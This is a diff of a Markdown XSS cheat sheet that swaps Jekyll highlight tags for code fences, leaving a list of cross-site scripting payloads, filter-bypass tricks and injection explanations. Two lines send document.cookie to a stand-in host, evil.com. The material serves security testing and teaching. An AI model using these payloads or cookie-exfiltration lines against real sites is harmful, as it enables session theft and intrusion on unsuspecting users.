@@ -58,22 +58,22 @@ A very useful OWASP XSS [cheatsheet](https://cheatsheetseries.owasp.org/cheatshe
 Another useful [cheatsheet repo & other links](https://github.com/RenwaX23/XSS-Payloads/tree/master)
 
 #### XSS Locators
-{% highlight HTML %}
+```HTML
 '';!--"<XSS>=&{()}
-{% endhighlight %}
+```
 
 #### Classic Payloads
-{% highlight HTML %}
+```HTML
 <svg/onload=alert(1)>
 <script>alert(1)</script>
 <script    >alert(1)</script>
 <ScRipT>alert(1)</scRipT>
 <%00script>alert(1)</script>
 <script>al%00ert(1)</script>
-{% endhighlight %}
+```
 
 #### HTML Tags
-{% highlight HTML %}
+```HTML
 <img/src=x a='' onerror=alert(1)>
 <IMG """><SCRIPT>alert(1)</SCRIPT>">
 <img src=`x`onerror=alert(1)>
@@ -88,7 +88,7 @@ Another useful [cheatsheet repo & other links](https://github.com/RenwaX23/XSS-P
 <svg><discard onbegin=alert(1)>
 <script>image = new Image(); image.src="https://evil.com/?c="+document.cookie;</script>
 <script>image = new Image(); image.src="http://"+document.cookie+"evil.com/";</script>
-{% endhighlight %}
+```
 
 The `javascript:alert(1);` can be injected to run in-line java (eg. in a URL)
 
@@ -96,30 +96,30 @@ The `javascript:alert(1);` can be injected to run in-line java (eg. in a URL)
 #### Bypass Angle Bracket Filter
 In a Reflective XSS where the `<` & `>` are both blacklisted/encoded. You can still inject code if the user input is injected within a tag already. This relies on the `"` not being escaped as `&quot`.
 
-{% highlight HTML %}
+```HTML
 " onmouseover="alert(1)
-{% endhighlight %}
+```
 
 Would result in something like a search box like:
-{% highlight HTML %}
+```HTML
 <input type=text placeholder='Search the blog...' name=search value="{{ user.input }}">
-{% endhighlight %}
+```
 
 Being turned into:
-{% highlight HTML %}
+```HTML
 <input type=text placeholder='Search the blog...' name=search value="" onmouseover="alert(1)">
-{% endhighlight %}
+```
 
 #### String Subtraction Injection
 If a variable is set of the user input eg.
-{% highlight js %}
+```js
 var userInput = '';
-{% endhighlight %}
+```
 
 If you then take a string and subtract a function from it, it will in turn run the function. Eg.
-{% highlight js %}
+```js
 var userInput = ''-alert(1)-'';
-{% endhighlight %}
+```
 
 So the payload would be `'-alert(1)-'`
 
